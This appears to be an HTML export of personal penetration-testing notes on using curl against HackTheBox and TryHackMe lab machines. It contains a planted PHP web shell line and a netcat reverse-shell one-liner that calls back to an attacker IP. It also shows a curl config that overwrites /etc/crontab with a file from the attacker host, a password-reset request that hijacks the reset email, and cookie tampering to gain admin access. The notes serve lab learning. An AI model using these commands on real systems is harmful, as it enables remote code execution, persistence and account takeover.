<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>curl & dns</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>curl & dns</h1><br/>DNS Isolation (Igintion@HTB) can be temporarily solved by adding IP &amp; Virutal Host Name in our local hosts file.<br /><br />‚îå‚îÄ‚îÄ(rootüíÄmatrix)-[~]<br />‚îî‚îÄ# cat /etc/hosts<br />127.0.0.1       localhost<br />127.0.1.1       matrix.matrix.securex.net       matrix<br />10.129.88.45    ignition.htb<br /><br /><br />curl -v http://{Target_IP}<br /><br /><a href=""><img src="images/17-1.png" alt="images/17-1.png" /></a><br /><br /><br /><br />tee is used to edit here...<br /><br /><a href=""><img src="images/17-2.png" alt="images/17-2.png" /></a><br /><br /><strong><br />More About Curl</strong><br /><br />curl -s <a href="http://10.10.10.150/secret.txt">http://10.10.10.150/secret.txt</a> | base64 -d &amp;&amp; echo<br /><br />-s For Silent Mode<br /><br />After Getting Remote Code Execution for a php web server.<br />[In the index.php we managed to add ‚Äúsystem($_REQUEST[‚Äã&#39;pwn&#39;‚Äã]);‚Äù  ]<br />On Browser:<br /><a href="http://10.10.10.150/index.php?pwn=id">http://10.10.10.150/index.php?pwn=id</a><br />Curl Terminal Alternative:<br />curl <a href="http://10.10.10.150/index.php">http://10.10.10.150/index.php</a> -G --data-urlencode ‚Äòpwn=id‚Äô<br /><br />-G For GET method, rather than post. <br />--data-urlencode : Converts the commands into url readable form http://.....php?pwn=<br /><br /><br />Reverse shell Example<br />curl <a href="http://10.10.10.150/index.php">http://10.10.10.150/index.php</a> -G --data-urlencode ‚Äã&#39;pwn=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 1234 &gt;/tmp/f&#39;<br /><br /><br />curl -K config_file : This option is used a specify a config file. The values will override the -o output.<br /><br />Example contents of config_file:<br />url = ‚Äã&quot;<a href="http://10.10.14.2/crontab">http://10.10.14.2/crontab</a>&quot;<br />output = ‚Äã&quot;/etc/crontab&quot;<br /><br /><br /><strong>Base Password Change Request:</strong><br />curl &#39;<a href="http://10.10.226.40/customers/reset?email=robert%40acmeitsupport.thm'">http://10.10.226.40/customers/reset?email=robert%40acmeitsupport.thm&#39;</a> -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -d &#39;username=robert&#39;<br /><br /><strong>Demonized Password Change Request(bob gets a mail):</strong><br />curl &#39;<a href="http://10.10.226.40/customers/reset?email=robert%40acmeitsupport.thm'">http://10.10.226.40/customers/reset?email=robert%40acmeitsupport.thm&#39;</a> -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -d &#39;username=robert&amp;email=bob@customer.acmeitsupport.thm&#39;<br /><br /><br /><strong>Tampering the Cookies:</strong><br /><br />curl -H &quot;Cookie: logged_in=true; admin=true&quot; <a href="http://10.10.226.40/cookie-test">http://10.10.226.40/cookie-test</a><br /></div>
</body>
</html>
